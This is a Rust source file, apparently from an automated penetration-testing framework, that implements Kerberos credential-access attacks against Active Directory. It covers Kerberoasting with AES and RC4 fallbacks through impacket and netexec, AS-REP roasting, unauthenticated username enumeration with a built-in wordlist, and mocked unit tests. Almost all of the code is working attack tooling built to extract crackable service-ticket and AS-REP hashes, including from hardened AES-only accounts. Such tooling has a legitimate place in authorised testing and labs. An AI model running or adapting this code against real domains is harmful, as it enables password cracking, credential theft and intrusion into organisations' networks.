//! Kerberos credential access tool executors (kerberoast, AS-REP roast,
//! user enumeration).

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_str, required_str};
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Request TGS tickets for SPNs via `impacket-GetUserSPNs`.
///
/// Given a cleartext password, `impacket-GetUserSPNs` deliberately derives NT
/// hashes and requests an **RC4** TGT ("to maximize the probability of getting
/// session tickets with RC4 etype"). The service ticket it then requests only
/// offers RC4/DES, so an AES-only SPN account — one whose
/// `msDS-SupportedEncryptionTypes` excludes RC4, the hardened / GOAD default —
/// answers `KDC_ERR_ETYPE_NOSUPP` and *no hash is returned at all*. The deployed
/// impacket predates the `-no-rc4` flag that suppresses this, so we obtain an
/// AES TGT out-of-band with `impacket-getTGT` and roast against that ccache
/// (`-k -no-pass`). The TGS request then offers the TGT's AES enctype and the
/// KDC issues an AES (etype 17/18) ticket. RC4-capable accounts still yield RC4
/// tickets because RC4 stays first in the requested etype list, so this is a
/// strict superset of the direct-password roast, which we keep as a fallback
/// for when getTGT can't run (missing binary, clock skew, unusual cred format).
///
/// When neither impacket attempt returns a `$krb5tgs$` hash we make a final
/// pass with `netexec --kerberoasting` (see [`netexec_kerberoast`]) — an
/// independent code path that can still succeed where impacket strikes out.
pub async fn kerberoast(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target_pw = format!("{domain}/{username}:{password}");

    let no_rc4 = crate::credentials::etype_hint_is_aes_only(args);

    // Preferred path: AES TGT via getTGT, then roast against the ccache so the
    // KDC will issue AES service tickets for AES-only accounts.
    if let Ok(dir) = tempfile::tempdir() {
        let tgt = CommandBuilder::new("impacket-getTGT")
            .arg(&target_pw)
            .flag("-dc-ip", dc_ip)
            .current_dir(dir.path())
            .timeout_secs(60)
            .execute()
            .await;

        // impacket-getTGT writes `<username>.ccache` into the working directory.
        let ccache = dir.path().join(format!("{username}.ccache"));
        if tgt.is_ok() && ccache.exists() {
            let target_k = format!("{domain}/{username}");
            let roast = CommandBuilder::new("impacket-GetUserSPNs")
                .arg(&target_k)
                .arg("-k")
                .arg("-no-pass")
                .flag("-dc-ip", dc_ip)
                .arg("-request")
                .arg_if(no_rc4, "-no-rc4")
                .env("KRB5CCNAME", ccache.to_string_lossy().to_string())
                .timeout_secs(60)
                .execute()
                .await;
            // Only accept the AES ccache roast if it actually returned a hash;
            // otherwise fall through to the password roast and netexec fallback
            // rather than surfacing an empty AES result as the final answer.
            if matches!(&roast, Ok(o) if o.combined_raw().contains("$krb5tgs$")) {
                return roast;
            }
        }
    }

    // Fallback 1: direct password roast (RC4 TGT). Works for RC4-capable accounts.
    let pw_roast = CommandBuilder::new("impacket-GetUserSPNs")
        .arg(&target_pw)
        .flag("-dc-ip", dc_ip)
        .arg("-request")
        .arg_if(no_rc4, "-no-rc4")
        .timeout_secs(60)
        .execute()
        .await;
    if matches!(&pw_roast, Ok(o) if o.combined_raw().contains("$krb5tgs$")) {
        return pw_roast;
    }

    // Fallback 2: netexec `--kerberoasting`, KDC pinned by IP. impacket's roast
    // can strike out on AES-only SPNs when getTGT can't run (clock skew, missing
    // binary); netexec is an independent path that may still land a hash.
    match netexec_kerberoast(domain, username, password, dc_ip).await {
        Ok(nxc) if nxc.combined_raw().contains("$krb5tgs$") => Ok(nxc),
        // netexec found nothing either — return the password-roast result so the
        // caller sees impacket's (more actionable) error output, not netexec's.
        _ => pw_roast,
    }
}

/// Kerberoast fallback via `netexec ldap ... --kerberoasting`.
///
/// The load-bearing flag is `--kdcHost <dc_ip>`. Without it netexec (through
/// impacket) resolves the KDC from the realm *name* — e.g. `CONTOSO.LOCAL:88` —
/// over DNS. On isolated lab boxes with no AD-integrated DNS resolver that
/// lookup fails, netexec never issues the TGS-REQ, and the whole path is a
/// non-starter as a fallback for the AES-only accounts impacket also misses.
/// Pinning the KDC to the DC IP makes netexec viable for exactly those accounts.
async fn netexec_kerberoast(
    domain: &str,
    username: &str,
    password: &str,
    dc_ip: &str,
) -> Result<ToolOutput> {
    // Unique output path so overlapping roasts within one process don't collide.
    let out_file = format!(
        "/tmp/nxc_kerberoast_{}_{}.txt",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0)
    );

    let mut result = CommandBuilder::new("netexec")
        .arg("ldap")
        .arg(dc_ip)
        .flag("-u", username)
        .flag("-p", password)
        .flag("-d", domain)
        .flag("--kdcHost", dc_ip)
        .flag("--kerberoasting", out_file.as_str())
        .timeout_secs(120)
        .execute()
        .await?;

    // netexec writes the TGS blobs to `--kerberoasting <file>`; fold them into
    // stdout so the downstream `$krb5tgs$` extractor sees them even on builds
    // that stay quiet on the console.
    if !result.stdout.contains("$krb5tgs$") {
        if let Ok(file_hashes) = std::fs::read_to_string(&out_file) {
            if !file_hashes.trim().is_empty() {
                if !result.stdout.is_empty() {
                    result.stdout.push('\n');
                }
                result.stdout.push_str(&file_hashes);
            }
        }
    }
    let _ = std::fs::remove_file(&out_file);
    Ok(result)
}

/// Request AS-REP hashes for accounts without pre-auth via `impacket-GetNPUsers`.
///
/// Supports two modes:
/// - With credentials: uses LDAP to enumerate users, then checks for no-preauth
/// - Without credentials: uses `-usersfile` with a wordlist and `-no-pass`
pub async fn asrep_roast(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let username = optional_str(args, "username").unwrap_or("");
    let password = optional_str(args, "password").unwrap_or("");
    let users_file = optional_str(args, "users_file");
    // Accept an inline username array via `known_users`. The orchestrator's
    // auto_credential_access automation discovers users via LDAP-via-ticket
    // and ACL enum, then injects them here so we don't have to re-enumerate
    // (which fails on hardened/SID-filtered DCs anyway). Dropping this read
    // would force asrep_roast to fall back to the generic seclists wordlist
    // and miss lab-specific enumerated accounts.
    let known_users: Vec<String> = args
        .get("known_users")
        .and_then(|v| v.as_array())
        .map(|arr| {
            arr.iter()
                .filter_map(|x| x.as_str().map(str::to_string))
                .filter(|s| !s.is_empty())
                .collect()
        })
        .unwrap_or_default();

    let mut cmd = CommandBuilder::new("impacket-GetNPUsers");

    // Materialize known_users (if any) to a temp file so we can pass it via
    // -usersfile. The temp file persists until process exit — short-lived
    // for AS-REP roast invocations.
    let known_users_tmp: Option<String> = if !known_users.is_empty() {
        let path = format!(
            "/tmp/asrep_known_users_{}_{}.txt",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or(0)
        );
        std::fs::write(&path, known_users.join("\n"))?;
        Some(path)
    } else {
        None
    };

    if !username.is_empty() && !password.is_empty() {
        // Authenticated mode: LDAP user enumeration
        let target = format!("{domain}/{username}:{password}");
        cmd = cmd.arg(&target);
    } else if let Some(uf) = users_file {
        // No-auth mode with explicit user file
        let target = format!("{domain}/");
        cmd = cmd.arg(&target).flag("-usersfile", uf).arg("-no-pass");
    } else if let Some(ref path) = known_users_tmp {
        // No-auth mode with orchestrator-supplied known_users array
        let target = format!("{domain}/");
        cmd = cmd.arg(&target).flag("-usersfile", path).arg("-no-pass");
    } else {
        // No-auth mode: use seclists if available, otherwise built-in AD usernames
        let target = format!("{domain}/");
        let seclists = "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt";
        if std::path::Path::new(seclists).exists() {
            cmd = cmd
                .arg(&target)
                .flag("-usersfile", seclists)
                .arg("-no-pass");
        } else {
            let tmp = format!("/tmp/asrep_users_{}.txt", std::process::id());
            std::fs::write(&tmp, DEFAULT_AD_USERNAMES)?;
            cmd = cmd.arg(&target).flag("-usersfile", &tmp).arg("-no-pass");
        }
    }

    let result = cmd
        .flag("-dc-ip", dc_ip)
        .arg("-request")
        .timeout_secs(120)
        .execute()
        .await;

    if let Some(path) = known_users_tmp {
        let _ = std::fs::remove_file(&path);
    }

    result
}

/// Common AD usernames for unauthenticated Kerberos enumeration.
pub(crate) const DEFAULT_AD_USERNAMES: &str = "\
Administrator\nadmin\nguest\nkrbtgt\n\
DefaultAccount\n\
sql_svc\nsvc_sql\nsqlservice\nsvc_mssql\n\
svc_backup\nbackup\n\
svc_web\nwebservice\n\
svc_iis\niis_svc\n\
svc_exchange\nexchange\n\
svc_admin\n\
svc_test\n\
testuser\ntest\n\
user1\nuser2\nuser3\n\
sam.wilson\njohn.smith\njohn.smith\n\
alice.jones\nsarah.connor\nbrian.davis\nedward.davis\n\
carol.lane\njames.lane\ntim.lane\n\
diana.torres\njoe.morgan\n\
steve.baker\nrichard.baker\n\
jdoe\nrobert.davis\ntom.green\n\
michelle\nkarl.davidson\nvictor.torres\n\
jeff.baker\ntony.baker\n\
paul.jackson\nlaura.chen\nmark.reed\n\
terry.lane\nbetty.taylor\n\
frank.ward\ndavid.ward\n\
lisa.murray\nkevin.murray\n\
nina.cole\nrosa.west\n\
derek.hunt\nclaire.hunt\n\
swilson\njdavis\nrcon\n\
";

/// Enumerate valid usernames via Kerberos pre-auth without credentials.
pub async fn kerberos_user_enum_noauth(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let users_file = optional_str(args, "users_file");

    let target = format!("{domain}/");

    // Use provided wordlist, seclists if available, or built-in defaults
    let tmp_file;
    let seclists = "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt";
    let wordlist_path = if let Some(uf) = users_file {
        uf.to_string()
    } else if std::path::Path::new(seclists).exists() {
        seclists.to_string()
    } else {
        tmp_file = format!("/tmp/kerberos_users_{}.txt", std::process::id());
        std::fs::write(&tmp_file, DEFAULT_AD_USERNAMES)?;
        tmp_file
    };

    let result = CommandBuilder::new("impacket-GetNPUsers")
        .arg(&target)
        .flag("-usersfile", &wordlist_path)
        .flag("-dc-ip", dc_ip)
        .arg("-no-pass")
        .timeout_secs(180)
        .execute()
        .await;

    // Clean up temp file if we created one (only when we wrote it ourselves)
    let wrote_tmp = users_file.is_none() && !std::path::Path::new(seclists).exists();
    if wrote_tmp {
        let _ = std::fs::remove_file(&wordlist_path);
    }

    result
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_str, required_str};
    use serde_json::json;

    #[test]
    fn kerberoast_target_format() {
        let domain = "contoso.local";
        let username = "admin";
        let password = "P@ssw0rd!";
        let target = format!("{domain}/{username}:{password}");
        assert_eq!(target, "contoso.local/admin:P@ssw0rd!");
    }

    #[test]
    fn kerberoast_requires_domain() {
        let args = json!({
            "username": "admin",
            "password": "P@ss",
            "dc_ip": "192.168.58.1"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn kerberoast_requires_username() {
        let args = json!({
            "domain": "contoso.local",
            "password": "P@ss",
            "dc_ip": "192.168.58.1"
        });
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn kerberoast_requires_password() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.1"
        });
        assert!(required_str(&args, "password").is_err());
    }

    #[test]
    fn kerberoast_requires_dc_ip() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ss"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn asrep_roast_authenticated_format() {
        let domain = "contoso.local";
        let username = "admin";
        let password = "P@ssw0rd!";
        // When both username and password are non-empty, authenticated mode
        if !username.is_empty() && !password.is_empty() {
            let target = format!("{domain}/{username}:{password}");
            assert_eq!(target, "contoso.local/admin:P@ssw0rd!");
        } else {
            panic!("should be authenticated mode");
        }
    }

    #[test]
    fn asrep_roast_no_auth_format() {
        let domain = "contoso.local";
        let username = "";
        let password = "";
        if !username.is_empty() && !password.is_empty() {
            panic!("should be no-auth mode");
        } else {
            let target = format!("{domain}/");
            assert_eq!(target, "contoso.local/");
        }
    }

    #[test]
    fn asrep_roast_username_default_empty() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.1"
        });
        let username = optional_str(&args, "username").unwrap_or("");
        let password = optional_str(&args, "password").unwrap_or("");
        assert_eq!(username, "");
        assert_eq!(password, "");
    }

    #[test]
    fn asrep_roast_with_users_file() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.1",
            "users_file": "/tmp/users.txt"
        });
        let users_file = optional_str(&args, "users_file");
        assert_eq!(users_file, Some("/tmp/users.txt"));
    }

    #[test]
    fn default_ad_usernames_is_non_empty() {
        assert!(!super::DEFAULT_AD_USERNAMES.is_empty());
    }

    #[test]
    fn default_ad_usernames_contains_administrator() {
        assert!(super::DEFAULT_AD_USERNAMES.contains("Administrator"));
    }

    #[test]
    fn default_ad_usernames_contains_krbtgt() {
        assert!(super::DEFAULT_AD_USERNAMES.contains("krbtgt"));
    }

    #[test]
    fn kerberos_user_enum_requires_domain() {
        let args = json!({"dc_ip": "192.168.58.1"});
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn kerberos_user_enum_requires_dc_ip() {
        let args = json!({"domain": "contoso.local"});
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn kerberos_user_enum_target_format() {
        let domain = "contoso.local";
        let target = format!("{domain}/");
        assert_eq!(target, "contoso.local/");
    }

    #[test]
    fn kerberos_user_enum_optional_users_file() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.1",
            "users_file": "/tmp/custom_users.txt"
        });
        assert_eq!(
            optional_str(&args, "users_file"),
            Some("/tmp/custom_users.txt")
        );
    }

    #[test]
    fn kerberos_user_enum_no_users_file() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.1"
        });
        assert!(optional_str(&args, "users_file").is_none());
    }

    use crate::executor::mock;

    #[tokio::test]
    async fn kerberoast_executes() {
        // Three spawns: getTGT, the password roast, then the netexec fallback.
        // In tests no real ccache file is written, so the flow takes
        // getTGT -> (ccache missing) -> password roast (no hash) -> netexec
        // fallback. Each needs a queued mock or execute() would try to spawn
        // the real binaries.
        mock::push(mock::success()); // impacket-getTGT
        mock::push(mock::success()); // impacket-GetUserSPNs (password roast)
        mock::push(mock::success()); // netexec --kerberoasting (fallback)
        let args = json!({
            "domain": "contoso.local", "username": "admin",
            "password": "P@ss", "dc_ip": "192.168.58.1"
        });
        assert!(super::kerberoast(&args).await.is_ok());
    }

    #[tokio::test]
    async fn kerberoast_password_roast_hash_short_circuits() {
        // getTGT writes no ccache in tests, so the flow reaches the password
        // roast. When that returns a $krb5tgs$ hash the netexec fallback must
        // NOT run — only two mocks are queued, so a stray third spawn would
        // fall through to real execution and fail the test.
        mock::push(mock::success()); // impacket-getTGT
        mock::push(mock::success_with_stdout(
            "$krb5tgs$23$*svc_sql$CONTOSO.LOCAL$contoso.local/svc_sql*$abc$def",
        )); // password roast returns a hash
        let args = json!({
            "domain": "contoso.local", "username": "svc_sql",
            "password": "P@ss", "dc_ip": "192.168.58.1"
        });
        let out = super::kerberoast(&args).await.unwrap();
        assert!(out.stdout.contains("$krb5tgs$"));
    }

    #[tokio::test]
    async fn kerberoast_falls_back_to_netexec_when_impacket_dry() {
        // Both impacket attempts return no hash; the netexec fallback lands one.
        mock::push(mock::success()); // impacket-getTGT
        mock::push(mock::success()); // password roast, no hash
        mock::push(mock::success_with_stdout(
            "$krb5tgs$23$*svc_web$CONTOSO.LOCAL$contoso.local/svc_web*$aa$bb",
        )); // netexec --kerberoasting returns a hash
        let args = json!({
            "domain": "contoso.local", "username": "svc_web",
            "password": "P@ss", "dc_ip": "192.168.58.1"
        });
        let out = super::kerberoast(&args).await.unwrap();
        assert!(out.stdout.contains("$krb5tgs$"));
    }

    #[tokio::test]
    async fn asrep_roast_authenticated_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "dc_ip": "192.168.58.1",
            "username": "admin", "password": "P@ss"
        });
        assert!(super::asrep_roast(&args).await.is_ok());
    }

    #[tokio::test]
    async fn asrep_roast_with_users_file_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "dc_ip": "192.168.58.1",
            "users_file": "/tmp/users.txt"
        });
        assert!(super::asrep_roast(&args).await.is_ok());
    }

    #[tokio::test]
    async fn kerberos_user_enum_with_file_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "dc_ip": "192.168.58.1",
            "users_file": "/tmp/users.txt"
        });
        assert!(super::kerberos_user_enum_noauth(&args).await.is_ok());
    }
}
